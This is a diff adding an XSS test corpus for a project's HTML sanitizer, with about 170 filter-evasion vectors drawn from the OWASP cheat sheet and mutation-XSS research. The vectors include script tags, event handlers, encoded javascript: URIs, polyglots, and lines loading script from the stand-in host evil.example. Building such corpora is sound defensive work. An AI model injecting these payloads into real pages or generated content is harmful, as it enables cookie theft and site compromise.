@@ -1,0 +1,174 @@
+# XSS corpus for tumnis.core.sanitize (P0-16, SEC-4): one vector per line; lines starting
+# with "#" are comments. Sources: the OWASP XSS Filter Evasion Cheat Sheet, mutation-XSS
+# write-ups (nested noscript, svg foreignObject, broken comments, entity-split schemes), and
+# every finding of the property test (T-P0-16-05). Add to the end; never delete a line.
+<script>alert(1)</script>
+<SCRIPT SRC=https://evil.example/xss.js></SCRIPT>
+<script src=//evil.example/x.js></script>
+<SCRIPT/XSS SRC="https://evil.example/xss.js"></SCRIPT>
+<SCRIPT/SRC="https://evil.example/xss.js"></SCRIPT>
+<<SCRIPT>alert("XSS");//\<</SCRIPT>
+<SCRIPT SRC=//evil.example/.j>
+<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
+</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<script type="text/javascript">javascript:alert(1);</script>
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG SRC=# onmouseover="alert('xxs')">
+<IMG SRC= onmouseover="alert('xxs')">
+<IMG onmouseover="alert('xxs')">
+<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
+<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<IMG SRC="jav	ascript:alert('XSS');">
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+<IMG SRC=" &#14;  javascript:alert('XSS');">
+<IMG SRC="javascript:alert('XSS')"
+<IMG DYNSRC="javascript:alert('XSS')">
+<IMG LOWSRC="javascript:alert('XSS')">
+<IMG SRC='vbscript:msgbox("XSS")'>
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+<img src=x:alert(alt) onerror=eval(src) alt=0>
+<a href="javascript:alert(1)">click</a>
+<a href="JaVaScRiPt:alert(1)">click</a>
+<a href="jav&#x09;ascript:alert(1)">tab split</a>
+<a href="jav&#x0A;ascript:alert(1)">newline split</a>
+<a href="&#106;avascript:alert(1)">entity</a>
+<a href="&#x6A;avascript:alert(1)">hex entity</a>
+<a href="&#0000106avascript:alert(1)">padded entity</a>
+<a href=" javascript:alert(1)">leading space</a>
+<a href="&#14;javascript:alert(1)">control char</a>
+<a href="javascript&colon;alert(1)">named colon</a>
+<a href="java&Tab;script:alert(1)">named tab</a>
+<a href="vbscript:msgbox(1)">vb</a>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">data</a>
+<a href="data:text/html,<script>alert(1)</script>">data plain</a>
+<a href="livescript:alert(1)">livescript</a>
+<a href="feed:javascript:alert(1)">feed</a>
+<a href=javascript:alert(1)>unquoted</a>
+<a href="//evil.example" onclick="alert(1)">onclick</a>
+<a href="https://ok.example" style="background:url(javascript:alert(1))">style</a>
+<a href="https://ok.example" target="_blank" rel="opener">opener</a>
+<a xlink:href="javascript:alert(1)">xlink</a>
+<a href="http://ok.example/" onmouseover=alert(1)//>x</a>
+<BODY BACKGROUND="javascript:alert('XSS')">
+<BODY ONLOAD=alert('XSS')>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<BGSOUND SRC="javascript:alert('XSS');">
+<BR SIZE="&{alert('XSS')}">
+<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+<LINK REL="stylesheet" HREF="https://evil.example/xss.css">
+<STYLE>@import'https://evil.example/xss.css';</STYLE>
+<META HTTP-EQUIV="Link" Content="<https://evil.example/xss.css>; REL=stylesheet">
+<STYLE>BODY{-moz-binding:url("https://evil.example/xssmoz.xml#xss")}</STYLE>
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+<XSS STYLE="xss:expression(alert('XSS'))">
+<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
+<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
+<DIV STYLE="width: expression(alert('XSS'));">
+<span style="color:red" onclick="alert(1)">span</span>
+<p onmouseover="alert(1)">para</p>
+<TABLE BACKGROUND="javascript:alert('XSS')">
+<TABLE><TD BACKGROUND="javascript:alert('XSS')">
+<td colspan="2" onclick="alert(1)">cell</td>
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+<OBJECT TYPE="text/x-scriptlet" DATA="https://evil.example/scriptlet.html"></OBJECT>
+<object data="javascript:alert(1)"></object>
+<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
+<embed src="javascript:alert(1)">
+<svg/onload=alert('XSS')>
+<svg><script>alert(1)</script></svg>
+<svg><foreignObject><p><iframe src="javascript:alert(1)"></iframe></p></foreignObject></svg>
+<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>
+<svg><a xlink:href="javascript:alert(1)"><text x="20" y="20">XSS</text></a></svg>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><set attributeName="href" to="javascript:alert(1)"/></svg>
+<svg><style><img src=x onerror=alert(1)></style></svg>
+<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>
+<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">
+<math href="javascript:alert(1)">CLICKME</math>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<noscript><noscript></noscript><img src=x onerror=alert(1)></noscript>
+<noembed><img title="</noembed><img src onerror=alert(1)>"></noembed>
+<noframes><img title="</noframes><img src onerror=alert(1)>"></noframes>
+<xmp><img title="</xmp><img src onerror=alert(1)>"></xmp>
+<template><script>alert(1)</script></template>
+<template><img src=x onerror=alert(1)></template>
+<!--<img src="--><img src=x onerror=alert(1)//">
+<!-- --!><img src=x onerror=alert(1)> -->
+<!--><img src=x onerror=alert(1)>-->
+<!---><img src=x onerror=alert(1)>-->
+<![CDATA[<img src=x onerror=alert(1)>]]>
+<?xml version="1.0"?><img src=x onerror=alert(1)>
+<!DOCTYPE html><script>alert(1)</script>
+<form action="javascript:alert(1)"><input type=submit></form>
+<form><button formaction="javascript:alert(1)">X</button></form>
+<input type="image" src="javascript:alert(1)">
+<input onfocus=alert(1) autofocus>
+<select onfocus=alert(1) autofocus><option>x</option></select>
+<textarea onfocus=alert(1) autofocus>x</textarea>
+<textarea></textarea><img src=x onerror=alert(1)>
+<video><source onerror="alert(1)"></video>
+<video poster=javascript:alert(1)//></video>
+<audio src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>XSS</marquee>
+<isindex type=image src=1 onerror=alert(1)>
+<base href="javascript:alert('XSS');//">
+<BASE HREF="https://evil.example/">
+<keygen autofocus onfocus=alert(1)>
+<div><style><img src=x onerror=alert(1)></style></div>
+<table><style><img src=x onerror=alert(1)></style></table>
+<a href="https://ok.example/"><table><a href="javascript:alert(1)">nested</a></table></a>
+<p><svg><style><a id="</style><img src=1 onerror=alert(1)>"></style></svg></p>
+<div id="x"><a href="#" onclick="alert(1)">x</a></div>
+<ul><li onclick=alert(1)>item</li></ul>
+<h1 onmouseover=alert(1)>title</h1>
+<blockquote cite="javascript:alert(1)">quote</blockquote>
+<code onclick=alert(1)>code</code>
+<pre style="background:url(javascript:alert(1))">pre</pre>
+<b/onclick=alert(1)>bold</b>
+<i	onclick=alert(1)>italic</i>
+<em/style=x:expression(alert(1))>em</em>
+<a href="https://ok.example/"/onclick=alert(1)>slash</a>
+<a """ href="javascript:alert(1)">quotes</a>
+<a href="h&#116;tps://ok.example/" onfocus=alert(1) autofocus>entities</a>
+<a href="%6A%61%76%61%73%63%72%69%70%74:alert(1)">percent</a>
+<a href="\x6Aavascript:alert(1)">backslash</a>
+<a href="javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>polyglot</a>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+"><script>alert(1)</script>
+'><img src=x onerror=alert(1)>
+</p><script>alert(1)</script><p>
+<div>unclosed <script>alert(1)
+<plaintext><script>alert(1)</script>
+<title><script>alert(1)</script></title>
+<applet code="javascript:alert(1)"></applet>
+<x-custom onclick=alert(1)>custom</x-custom>
+<div is="x" onclick=alert(1)>is</div>
+<span data-x="javascript:alert(1)" class="evil" id="evil">data attr</span>
+<a href="mailto:a@example.com?body=<script>alert(1)</script>" onclick=alert(1)>mail</a>
+<a href="tel:+1555" onclick=alert(1)>tel</a>
+<a href="ftp://evil.example/">ftp</a>
+<img src="https://tracker.example/pixel.gif" width=1 height=1>
+<picture><source srcset="https://tracker.example/p.png"><img src=x></picture>
+<a href="https://ok.example/" ping="https://tracker.example/">ping</a>
